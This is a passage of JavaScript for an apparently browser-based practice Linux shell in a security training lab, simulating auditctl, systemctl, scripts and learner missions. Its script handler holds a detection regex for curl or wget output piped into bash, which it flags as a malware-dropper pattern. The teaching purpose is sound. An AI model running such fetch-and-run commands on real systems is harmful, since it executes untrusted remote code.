        if (args[0] === '-l') { var rules = []; var rd = this.node('/etc/audit/rules.d'); if (rd) Object.keys(rd.ch).sort().forEach(function (k) { rd.ch[k].c.split('\n').forEach(function (l) { if (/^-[aw]/.test(l)) rules.push(l); }); }); return rules.length ? rules.join('\n') : 'No rules'; }
        return 'In this practice shell, add rules by writing them to /etc/audit/rules.d/ and list them with auditctl -l.';
      }
      default:
        if (this.funcs[cmd]) return this.callFunc(cmd, args);
        if (/^\(\(.*\)\)$/.test(cmd + (args.length ? ' ' + args.join(' ') : ''))) { var av = this.arith((cmd + ' ' + args.join(' ')).trim().slice(2, -2)); if (!av) this.fail(1); return ''; }
        if (/^(\.|~)?\/?[\w./-]+\.sh$/.test(cmd) || cmd.indexOf('./') === 0 || cmd[0] === '/') return this.script(cmd, false, args);
        this.err(cmd + ': command not found');
    }
  };
  Shell.prototype.script = function (p, viaShell, sargs) {
    if (!p) return '';
    var n = this.node(this.abs(p)); if (!n) this.err('bash: ' + p + ': No such file or directory');
    if (n.t === 'd') this.err('bash: ' + p + ': Is a directory');
    if (!viaShell && !this.can(n, 1)) this.err('bash: ' + p + ': Permission denied');
    if (viaShell && !this.can(n, 4)) this.err('bash: ' + p + ': Permission denied');
    if (n.c === 'ELF binary') return '';
    if (/(curl|wget)[^\n|]*\|\s*(sudo\s+)?(ba)?sh/.test(n.c)) return 'Stopped. This file pipes a download into bash, which is how many Linux malware droppers work. Never run it. Delete it with rm.';
    if (this.depth > 8) this.err('bash: too many nested scripts');
    var stream = this.stream, saved = this.cap, savedVars = this.script0;
    if (!stream) this.cap = [];
    this.args.push(sargs || []); this.script0 = p; this.depth++;
    var code = 0;
    try { this.execText(n.c); code = this.status || 0; }
    catch (e) { if (e.exitSig) code = e.code; else { this.args.pop(); this.depth--; this.script0 = savedVars; if (!stream) this.cap = saved; throw e; } }
    this.args.pop(); this.depth--; this.script0 = savedVars;
    var out = stream ? '' : this.cap.join('\n'); if (!stream) this.cap = saved;
    if (code) throw Object.assign(new Error(''), { sh: true, silent: true, code: code, out: out });
    return out;
  };
  Shell.prototype.callFunc = function (name, fargs) {
    var stream = this.stream, saved = this.cap; if (!stream) this.cap = [];
    this.args.push(fargs); var code = 0;
    try { this.execNodes(this.funcs[name]); code = this.status || 0; }
    catch (e) { if (e.retSig) code = e.code; else { this.args.pop(); if (!stream) this.cap = saved; throw e; } }
    this.args.pop();
    var out = stream ? '' : this.cap.join('\n'); if (!stream) this.cap = saved;
    if (code) throw Object.assign(new Error(''), { sh: true, silent: true, code: code, out: out });
    return out;
  };
  Shell.prototype.testExpr = function (a) {
    var self = this;
    if (a[0] === '!') return !this.testExpr(a.slice(1));
    var ai = a.indexOf('-a'), oi = a.indexOf('-o');
    if (oi > 0) return this.testExpr(a.slice(0, oi)) || this.testExpr(a.slice(oi + 1));
    if (ai > 0) return this.testExpr(a.slice(0, ai)) && this.testExpr(a.slice(ai + 1));
    if (a.length === 0) return false;
    if (a.length === 1) return a[0] !== '';
    if (a.length === 2) {
      var n = this.node(this.abs(a[1])), op = a[0];
      switch (op) {
        case '-z': return a[1] === ''; case '-n': return a[1] !== '';
        case '-e': return !!n; case '-f': return !!n && n.t === 'f'; case '-d': return !!n && n.t === 'd';
        case '-s': return !!n && n.t === 'f' && n.c.length > 0; case '-r': return !!n && this.can(n, 4); case '-w': return !!n && this.can(n, 2); case '-x': return !!n && this.can(n, 1);
      }
      this.err('bash: test: ' + op + ': unary operator expected');
    }
    var l = a[0], o = a[1], r = a.slice(2).join(' ');
    var num = function (x) { if (!/^-?\d+$/.test(x)) self.err('bash: [: ' + x + ': integer expression expected'); return +x; };
    switch (o) {
      case '=': case '==': return l === r; case '!=': return l !== r;
      case '-eq': return num(l) === num(r); case '-ne': return num(l) !== num(r); case '-gt': return num(l) > num(r);
      case '-lt': return num(l) < num(r); case '-ge': return num(l) >= num(r); case '-le': return num(l) <= num(r);
    }
    this.err('bash: [: ' + o + ': binary operator expected');
  };
  Shell.prototype.units = function () {
    var u = {}, self = this, sd = this.node('/etc/systemd/system'), wants = this.node('/etc/systemd/system/multi-user.target.wants');
    Object.keys(UNITS).forEach(function (k) { u[k] = { d: UNITS[k], path: '/usr/lib/systemd/system/' + k, en: true }; });
    if (sd) Object.keys(sd.ch).forEach(function (k) { var f = sd.ch[k]; if (/\.(service|timer)$/.test(k) && f.t === 'f') { var m = /Description=(.*)/.exec(f.c); u[k] = { d: m ? m[1] : k, path: '/etc/systemd/system/' + k, c: f.c, en: !!(wants && wants.ch[k]) }; } });
    Object.keys(this.svc).forEach(function (k) { if (u[k]) u[k].stopped = !!self.svc[k].stopped; });
    return u;
  };
  Shell.prototype.systemctl = function (a) {
    var u = this.units(), sub = a[0] || 'list-units', rest = a.slice(1).filter(function (x) { return x[0] !== '-'; }), name = rest[0] || '', self = this;
    var pad = function (x, n) { return (x + '                                        ').slice(0, n); };
    if (name && !/\./.test(name)) name += '.service';
    var ks = Object.keys(u).sort();
    switch (sub) {
      case 'list-units': return '  ' + pad('UNIT', 30) + 'LOAD   ACTIVE   SUB     DESCRIPTION\n' + ks.map(function (k) { return '  ' + pad(k, 30) + 'loaded ' + (u[k].stopped ? 'inactive dead    ' : 'active   running ') + u[k].d; }).join('\n') + '\n\n' + ks.length + ' loaded units listed.';
      case 'list-unit-files': return pad('UNIT FILE', 31) + 'STATE\n' + ks.map(function (k) { return pad(k, 31) + (u[k].en ? 'enabled' : 'disabled'); }).join('\n') + '\n\n' + ks.length + ' unit files listed.';
      case 'daemon-reload': return '';
    }
    if (!name) this.err('Too few arguments.');
    var x = u[name];
    switch (sub) {
      case 'status':
        if (!x) { throw Object.assign(new Error('Unit ' + name + ' could not be found.'), { sh: true, code: 4 }); }
        return '\u25CF ' + name + ' - ' + x.d + '\n     Loaded: loaded (' + x.path + '; ' + (x.en ? 'enabled' : 'disabled') + '; preset: enabled)\n     Active: ' + (x.stopped ? 'inactive (dead)' : 'active (running) since Fri 2026-11-20 08:00:03 IST; 1h 41min ago');
      case 'cat':
        if (!x) this.err('No files found for ' + name + '.');
        return '# ' + x.path + '\n' + (x.c ? x.c.replace(/\n$/, '') : '[Unit]\nDescription=' + x.d + '\n# (a normal unit shipped by its package)');
      case 'is-enabled': if (!x) this.err('Failed to get unit file state for ' + name + ': No such file or directory'); if (!x.en) throw Object.assign(new Error(''), { sh: true, silent: true, code: 1, out: 'disabled' }); return 'enabled';
      case 'is-active': if (!x || x.stopped) throw Object.assign(new Error(''), { sh: true, silent: true, code: 3, out: 'inactive' }); return 'active';
      case 'disable': case 'enable': case 'stop': case 'start': case 'restart': case 'mask':
        if (this.user !== 'root') this.err('Failed to ' + sub + ' unit: Interactive authentication required.');
        if (!x) this.err('Failed to ' + sub + ' unit: Unit file ' + name + ' does not exist.');
        var out = [];
        if (sub === 'disable' || sub === 'mask') {
          var wd = this.node('/etc/systemd/system/multi-user.target.wants');
          if (wd && wd.ch[name]) { delete wd.ch[name]; out.push('Removed "/etc/systemd/system/multi-user.target.wants/' + name + '".'); }
          if (a.indexOf('--now') > -1) this.svc[name] = { stopped: true };
        }
        if (sub === 'enable') {
          var wd2 = this.node('/etc/systemd/system/multi-user.target.wants');
          if (!wd2) { this.node('/etc/systemd/system').ch['multi-user.target.wants'] = { t: 'd', ch: {}, m: 493, o: 'root', g: 'root' }; wd2 = this.node('/etc/systemd/system/multi-user.target.wants'); }
          if (!wd2.ch[name]) { wd2.ch[name] = { t: 'f', c: '-> ' + x.path, m: 511, o: 'root', g: 'root' }; out.push('Created symlink /etc/systemd/system/multi-user.target.wants/' + name + ' \u2192 ' + x.path + '.'); }
          if (a.indexOf('--now') > -1) this.svc[name] = { stopped: false };
        }
        if (sub === 'stop') this.svc[name] = { stopped: true };
        if (sub === 'start' || sub === 'restart') this.svc[name] = { stopped: false };
        return out.join('\n');
    }
    this.err('Unknown command verb ' + sub + '.');
  };
  Shell.prototype.answer = function (v) {
    var m = (this.cfg.missions || [])[this.mi];
    if (!m || m.c.type !== 'answer') return 'No question is waiting for an answer right now.';
    this.lastAnswer = v.trim();
    return m.c.v.toLowerCase() === v.trim().toLowerCase() ? '' : 'Not that one. Look at the data again.';
  };

  /* ---------- mission checks ---------- */
  Shell.prototype.check = function (line) {
    var ms = this.cfg.missions || [], m = ms[this.mi]; if (!m) return;
    var c = m.c, ok = false, n;
    switch (c.type) {
      case 'cmd': ok = new RegExp(c.re).test(line.trim()); break;
      case 'cwd': ok = this.cwd === c.path; break;
      case 'exists': n = this.node(c.path); ok = !!n && (!c.kind || n.t === c.kind); break;
      case 'gone': ok = !this.node(c.path); break;
      case 'contains': n = this.node(c.path); ok = !!n && n.t === 'f' && n.c.toLowerCase().indexOf(c.text.toLowerCase()) > -1; break;
      case 'mode': n = this.node(c.path); ok = !!n && (c.octal ? (n.m & 511) === parseInt(c.octal, 8) : !!(n.m & c.bit)); break;
      case 'output': ok = this.last.out === c.v && (!c.re || new RegExp(c.re).test(line)); break;
      case 'answer': ok = this.lastAnswer != null && this.lastAnswer.toLowerCase() === c.v.toLowerCase(); break;
    }
    if (!ok) return;
    this.print('Mission ' + (this.mi + 1) + ' complete. ' + (m.ok || ''), 'ok');
    this.mi++; this.lastAnswer = null; this.renderMissions();
    if (this.mi === ms.length) {
      this.print('All ' + ms.length + ' missions done. Your progress for this lab section was saved in this browser.', 'ok');
      var ev = new CustomEvent('cwm:term-done', { detail: { id: this.cfg.id } }); document.dispatchEvent(ev);
    }
  };

  function init() {
    Array.prototype.forEach.call(document.querySelectorAll('.lx-term'), function (t) {
      var cfgEl = t.querySelector('.lx-term-cfg'), cfg = {};
      try { cfg = JSON.parse(cfgEl.textContent); } catch (e) { cfg = {}; }
      t.shell = new Shell(t, cfg);
    });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init); else init();
})();
